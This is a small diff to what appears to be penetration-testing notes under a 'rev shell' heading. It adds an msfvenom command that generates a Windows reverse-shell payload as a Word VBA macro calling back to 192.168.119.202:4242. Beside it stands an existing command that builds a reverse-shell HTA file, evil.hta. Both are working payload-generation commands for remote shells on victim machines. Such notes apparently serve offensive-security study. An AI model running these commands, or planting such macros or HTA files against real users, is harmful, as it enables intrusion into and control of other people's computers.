@@ -862,6 +862,9 @@ rev shell
 
 ```
 kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
+
+# to produce macro for word
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.202 LPORT=4242 -f vba-psh
 ```
 
 ```
